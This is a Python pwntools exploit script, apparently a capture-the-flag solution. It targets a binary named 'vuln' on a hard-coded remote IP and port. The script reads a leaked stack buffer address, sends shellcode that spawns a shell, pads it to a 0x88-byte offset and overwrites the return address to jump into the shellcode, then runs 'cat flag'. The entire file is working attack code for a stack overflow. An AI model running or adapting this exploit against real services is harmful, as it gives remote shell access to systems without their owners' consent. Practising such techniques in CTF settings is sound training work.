from pwn import *
import sys
import time


context.binary = ELF("./vuln", checksec=False)
context.arch = "amd64"

HOST = sys.argv[1] if len(sys.argv) > 1 else "47.99.147.34"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 26052
OFFSET = 0x88


def exploit(io):
    io.recvuntil(b"Buffer at: ")
    buf_addr = int(io.recvline().strip(), 16)
    io.recvuntil(b"Message: ")

    shellcode = asm(shellcraft.sh())
    payload = shellcode.ljust(OFFSET, b"\x90")
    payload += p64(buf_addr)

    io.send(payload)
    time.sleep(0.3)
    io.sendline(b"cat flag; exit")
    return io.recvall(timeout=2)


def main():
    io = remote(HOST, PORT)
    data = exploit(io)
    try:
        print(data.decode())
    except UnicodeDecodeError:
        print(data.decode("latin-1", errors="replace"))


if __name__ == "__main__":
    main()
